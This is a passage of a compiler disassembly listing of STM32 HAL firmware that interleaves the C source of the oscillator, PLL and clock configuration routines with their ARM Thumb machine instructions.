        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003ff2:	f7fd f9c5 	bl	8001380 <HAL_GetTick>
 8003ff6:	4602      	mov	r2, r0
 8003ff8:	693b      	ldr	r3, [r7, #16]
 8003ffa:	1ad3      	subs	r3, r2, r3
 8003ffc:	f241 3288 	movw	r2, #5000	; 0x1388
 8004000:	4293      	cmp	r3, r2
 8004002:	d901      	bls.n	8004008 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8004004:	2303      	movs	r3, #3
 8004006:	e14b      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8004008:	4b7d      	ldr	r3, [pc, #500]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 800400a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800400e:	f003 0302 	and.w	r3, r3, #2
 8004012:	2b00      	cmp	r3, #0
 8004014:	d1ed      	bne.n	8003ff2 <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8004016:	7ffb      	ldrb	r3, [r7, #31]
 8004018:	2b01      	cmp	r3, #1
 800401a:	d105      	bne.n	8004028 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 800401c:	4b78      	ldr	r3, [pc, #480]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 800401e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004020:	4a77      	ldr	r2, [pc, #476]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8004022:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004026:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8004028:	687b      	ldr	r3, [r7, #4]
 800402a:	681b      	ldr	r3, [r3, #0]
 800402c:	f003 0320 	and.w	r3, r3, #32
 8004030:	2b00      	cmp	r3, #0
 8004032:	d03c      	beq.n	80040ae <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8004034:	687b      	ldr	r3, [r7, #4]
 8004036:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004038:	2b00      	cmp	r3, #0
 800403a:	d01c      	beq.n	8004076 <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 800403c:	4b70      	ldr	r3, [pc, #448]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 800403e:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8004042:	4a6f      	ldr	r2, [pc, #444]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8004044:	f043 0301 	orr.w	r3, r3, #1
 8004048:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 800404c:	f7fd f998 	bl	8001380 <HAL_GetTick>
 8004050:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8004052:	e008      	b.n	8004066 <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8004054:	f7fd f994 	bl	8001380 <HAL_GetTick>
 8004058:	4602      	mov	r2, r0
 800405a:	693b      	ldr	r3, [r7, #16]
 800405c:	1ad3      	subs	r3, r2, r3
 800405e:	2b02      	cmp	r3, #2
 8004060:	d901      	bls.n	8004066 <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 8004062:	2303      	movs	r3, #3
 8004064:	e11c      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8004066:	4b66      	ldr	r3, [pc, #408]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8004068:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 800406c:	f003 0302 	and.w	r3, r3, #2
 8004070:	2b00      	cmp	r3, #0
 8004072:	d0ef      	beq.n	8004054 <HAL_RCC_OscConfig+0x5cc>
 8004074:	e01b      	b.n	80040ae <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8004076:	4b62      	ldr	r3, [pc, #392]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8004078:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 800407c:	4a60      	ldr	r2, [pc, #384]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 800407e:	f023 0301 	bic.w	r3, r3, #1
 8004082:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004086:	f7fd f97b 	bl	8001380 <HAL_GetTick>
 800408a:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 800408c:	e008      	b.n	80040a0 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 800408e:	f7fd f977 	bl	8001380 <HAL_GetTick>
 8004092:	4602      	mov	r2, r0
 8004094:	693b      	ldr	r3, [r7, #16]
 8004096:	1ad3      	subs	r3, r2, r3
 8004098:	2b02      	cmp	r3, #2
 800409a:	d901      	bls.n	80040a0 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 800409c:	2303      	movs	r3, #3
 800409e:	e0ff      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 80040a0:	4b57      	ldr	r3, [pc, #348]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 80040a2:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 80040a6:	f003 0302 	and.w	r3, r3, #2
 80040aa:	2b00      	cmp	r3, #0
 80040ac:	d1ef      	bne.n	800408e <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 80040ae:	687b      	ldr	r3, [r7, #4]
 80040b0:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80040b2:	2b00      	cmp	r3, #0
 80040b4:	f000 80f3 	beq.w	800429e <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 80040b8:	687b      	ldr	r3, [r7, #4]
 80040ba:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80040bc:	2b02      	cmp	r3, #2
 80040be:	f040 80c9 	bne.w	8004254 <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 80040c2:	4b4f      	ldr	r3, [pc, #316]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 80040c4:	68db      	ldr	r3, [r3, #12]
 80040c6:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 80040c8:	697b      	ldr	r3, [r7, #20]
 80040ca:	f003 0203 	and.w	r2, r3, #3
 80040ce:	687b      	ldr	r3, [r7, #4]
 80040d0:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80040d2:	429a      	cmp	r2, r3
 80040d4:	d12c      	bne.n	8004130 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 80040d6:	697b      	ldr	r3, [r7, #20]
 80040d8:	f003 0270 	and.w	r2, r3, #112	; 0x70
 80040dc:	687b      	ldr	r3, [r7, #4]
 80040de:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80040e0:	3b01      	subs	r3, #1
 80040e2:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 80040e4:	429a      	cmp	r2, r3
 80040e6:	d123      	bne.n	8004130 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 80040e8:	697b      	ldr	r3, [r7, #20]
 80040ea:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 80040ee:	687b      	ldr	r3, [r7, #4]
 80040f0:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80040f2:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 80040f4:	429a      	cmp	r2, r3
 80040f6:	d11b      	bne.n	8004130 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 80040f8:	697b      	ldr	r3, [r7, #20]
 80040fa:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 80040fe:	687b      	ldr	r3, [r7, #4]
 8004100:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8004102:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8004104:	429a      	cmp	r2, r3
 8004106:	d113      	bne.n	8004130 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8004108:	697b      	ldr	r3, [r7, #20]
 800410a:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 800410e:	687b      	ldr	r3, [r7, #4]
 8004110:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004112:	085b      	lsrs	r3, r3, #1
 8004114:	3b01      	subs	r3, #1
 8004116:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8004118:	429a      	cmp	r2, r3
 800411a:	d109      	bne.n	8004130 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 800411c:	697b      	ldr	r3, [r7, #20]
 800411e:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8004122:	687b      	ldr	r3, [r7, #4]
 8004124:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004126:	085b      	lsrs	r3, r3, #1
 8004128:	3b01      	subs	r3, #1
 800412a:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 800412c:	429a      	cmp	r2, r3
 800412e:	d06b      	beq.n	8004208 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8004130:	69bb      	ldr	r3, [r7, #24]
 8004132:	2b0c      	cmp	r3, #12
 8004134:	d062      	beq.n	80041fc <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8004136:	4b32      	ldr	r3, [pc, #200]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8004138:	681b      	ldr	r3, [r3, #0]
 800413a:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800413e:	2b00      	cmp	r3, #0
 8004140:	d001      	beq.n	8004146 <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 8004142:	2301      	movs	r3, #1
 8004144:	e0ac      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8004146:	4b2e      	ldr	r3, [pc, #184]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8004148:	681b      	ldr	r3, [r3, #0]
 800414a:	4a2d      	ldr	r2, [pc, #180]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 800414c:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8004150:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8004152:	f7fd f915 	bl	8001380 <HAL_GetTick>
 8004156:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004158:	e008      	b.n	800416c <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 800415a:	f7fd f911 	bl	8001380 <HAL_GetTick>
 800415e:	4602      	mov	r2, r0
 8004160:	693b      	ldr	r3, [r7, #16]
 8004162:	1ad3      	subs	r3, r2, r3
 8004164:	2b02      	cmp	r3, #2
 8004166:	d901      	bls.n	800416c <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8004168:	2303      	movs	r3, #3
 800416a:	e099      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 800416c:	4b24      	ldr	r3, [pc, #144]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 800416e:	681b      	ldr	r3, [r3, #0]
 8004170:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004174:	2b00      	cmp	r3, #0
 8004176:	d1f0      	bne.n	800415a <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8004178:	4b21      	ldr	r3, [pc, #132]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 800417a:	68da      	ldr	r2, [r3, #12]
 800417c:	4b21      	ldr	r3, [pc, #132]	; (8004204 <HAL_RCC_OscConfig+0x77c>)
 800417e:	4013      	ands	r3, r2
 8004180:	687a      	ldr	r2, [r7, #4]
 8004182:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 8004184:	687a      	ldr	r2, [r7, #4]
 8004186:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8004188:	3a01      	subs	r2, #1
 800418a:	0112      	lsls	r2, r2, #4
 800418c:	4311      	orrs	r1, r2
 800418e:	687a      	ldr	r2, [r7, #4]
 8004190:	6b52      	ldr	r2, [r2, #52]	; 0x34
 8004192:	0212      	lsls	r2, r2, #8
 8004194:	4311      	orrs	r1, r2
 8004196:	687a      	ldr	r2, [r7, #4]
 8004198:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 800419a:	0852      	lsrs	r2, r2, #1
 800419c:	3a01      	subs	r2, #1
 800419e:	0552      	lsls	r2, r2, #21
 80041a0:	4311      	orrs	r1, r2
 80041a2:	687a      	ldr	r2, [r7, #4]
 80041a4:	6c12      	ldr	r2, [r2, #64]	; 0x40
 80041a6:	0852      	lsrs	r2, r2, #1
 80041a8:	3a01      	subs	r2, #1
 80041aa:	0652      	lsls	r2, r2, #25
 80041ac:	4311      	orrs	r1, r2
 80041ae:	687a      	ldr	r2, [r7, #4]
 80041b0:	6b92      	ldr	r2, [r2, #56]	; 0x38
 80041b2:	06d2      	lsls	r2, r2, #27
 80041b4:	430a      	orrs	r2, r1
 80041b6:	4912      	ldr	r1, [pc, #72]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 80041b8:	4313      	orrs	r3, r2
 80041ba:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 80041bc:	4b10      	ldr	r3, [pc, #64]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 80041be:	681b      	ldr	r3, [r3, #0]
 80041c0:	4a0f      	ldr	r2, [pc, #60]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 80041c2:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80041c6:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 80041c8:	4b0d      	ldr	r3, [pc, #52]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 80041ca:	68db      	ldr	r3, [r3, #12]
 80041cc:	4a0c      	ldr	r2, [pc, #48]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 80041ce:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80041d2:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 80041d4:	f7fd f8d4 	bl	8001380 <HAL_GetTick>
 80041d8:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80041da:	e008      	b.n	80041ee <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80041dc:	f7fd f8d0 	bl	8001380 <HAL_GetTick>
 80041e0:	4602      	mov	r2, r0
 80041e2:	693b      	ldr	r3, [r7, #16]
 80041e4:	1ad3      	subs	r3, r2, r3
 80041e6:	2b02      	cmp	r3, #2
 80041e8:	d901      	bls.n	80041ee <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 80041ea:	2303      	movs	r3, #3
 80041ec:	e058      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80041ee:	4b04      	ldr	r3, [pc, #16]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 80041f0:	681b      	ldr	r3, [r3, #0]
 80041f2:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80041f6:	2b00      	cmp	r3, #0
 80041f8:	d0f0      	beq.n	80041dc <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 80041fa:	e050      	b.n	800429e <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 80041fc:	2301      	movs	r3, #1
 80041fe:	e04f      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
 8004200:	40021000 	.word	0x40021000
 8004204:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004208:	4b27      	ldr	r3, [pc, #156]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 800420a:	681b      	ldr	r3, [r3, #0]
 800420c:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004210:	2b00      	cmp	r3, #0
 8004212:	d144      	bne.n	800429e <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 8004214:	4b24      	ldr	r3, [pc, #144]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 8004216:	681b      	ldr	r3, [r3, #0]
 8004218:	4a23      	ldr	r2, [pc, #140]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 800421a:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800421e:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8004220:	4b21      	ldr	r3, [pc, #132]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 8004222:	68db      	ldr	r3, [r3, #12]
 8004224:	4a20      	ldr	r2, [pc, #128]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 8004226:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800422a:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 800422c:	f7fd f8a8 	bl	8001380 <HAL_GetTick>
 8004230:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004232:	e008      	b.n	8004246 <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004234:	f7fd f8a4 	bl	8001380 <HAL_GetTick>
 8004238:	4602      	mov	r2, r0
 800423a:	693b      	ldr	r3, [r7, #16]
 800423c:	1ad3      	subs	r3, r2, r3
 800423e:	2b02      	cmp	r3, #2
 8004240:	d901      	bls.n	8004246 <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 8004242:	2303      	movs	r3, #3
 8004244:	e02c      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004246:	4b18      	ldr	r3, [pc, #96]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 8004248:	681b      	ldr	r3, [r3, #0]
 800424a:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800424e:	2b00      	cmp	r3, #0
 8004250:	d0f0      	beq.n	8004234 <HAL_RCC_OscConfig+0x7ac>
 8004252:	e024      	b.n	800429e <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 8004254:	69bb      	ldr	r3, [r7, #24]
 8004256:	2b0c      	cmp	r3, #12
 8004258:	d01f      	beq.n	800429a <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 800425a:	4b13      	ldr	r3, [pc, #76]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 800425c:	681b      	ldr	r3, [r3, #0]
 800425e:	4a12      	ldr	r2, [pc, #72]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 8004260:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8004264:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8004266:	f7fd f88b 	bl	8001380 <HAL_GetTick>
 800426a:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 800426c:	e008      	b.n	8004280 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 800426e:	f7fd f887 	bl	8001380 <HAL_GetTick>
 8004272:	4602      	mov	r2, r0
 8004274:	693b      	ldr	r3, [r7, #16]
 8004276:	1ad3      	subs	r3, r2, r3
 8004278:	2b02      	cmp	r3, #2
 800427a:	d901      	bls.n	8004280 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 800427c:	2303      	movs	r3, #3
 800427e:	e00f      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004280:	4b09      	ldr	r3, [pc, #36]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 8004282:	681b      	ldr	r3, [r3, #0]
 8004284:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004288:	2b00      	cmp	r3, #0
 800428a:	d1f0      	bne.n	800426e <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 800428c:	4b06      	ldr	r3, [pc, #24]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 800428e:	68da      	ldr	r2, [r3, #12]
 8004290:	4905      	ldr	r1, [pc, #20]	; (80042a8 <HAL_RCC_OscConfig+0x820>)
 8004292:	4b06      	ldr	r3, [pc, #24]	; (80042ac <HAL_RCC_OscConfig+0x824>)
 8004294:	4013      	ands	r3, r2
 8004296:	60cb      	str	r3, [r1, #12]
 8004298:	e001      	b.n	800429e <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 800429a:	2301      	movs	r3, #1
 800429c:	e000      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 800429e:	2300      	movs	r3, #0
}
 80042a0:	4618      	mov	r0, r3
 80042a2:	3720      	adds	r7, #32
 80042a4:	46bd      	mov	sp, r7
 80042a6:	bd80      	pop	{r7, pc}
 80042a8:	40021000 	.word	0x40021000
 80042ac:	feeefffc 	.word	0xfeeefffc

080042b0 <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 80042b0:	b580      	push	{r7, lr}
 80042b2:	b084      	sub	sp, #16
 80042b4:	af00      	add	r7, sp, #0
 80042b6:	6078      	str	r0, [r7, #4]
 80042b8:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 80042ba:	687b      	ldr	r3, [r7, #4]
 80042bc:	2b00      	cmp	r3, #0
 80042be:	d101      	bne.n	80042c4 <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 80042c0:	2301      	movs	r3, #1
 80042c2:	e0e7      	b.n	8004494 <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 80042c4:	4b75      	ldr	r3, [pc, #468]	; (800449c <HAL_RCC_ClockConfig+0x1ec>)
 80042c6:	681b      	ldr	r3, [r3, #0]
 80042c8:	f003 0307 	and.w	r3, r3, #7
 80042cc:	683a      	ldr	r2, [r7, #0]
 80042ce:	429a      	cmp	r2, r3
 80042d0:	d910      	bls.n	80042f4 <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 80042d2:	4b72      	ldr	r3, [pc, #456]	; (800449c <HAL_RCC_ClockConfig+0x1ec>)
 80042d4:	681b      	ldr	r3, [r3, #0]
 80042d6:	f023 0207 	bic.w	r2, r3, #7
 80042da:	4970      	ldr	r1, [pc, #448]	; (800449c <HAL_RCC_ClockConfig+0x1ec>)
 80042dc:	683b      	ldr	r3, [r7, #0]
 80042de:	4313      	orrs	r3, r2
 80042e0:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
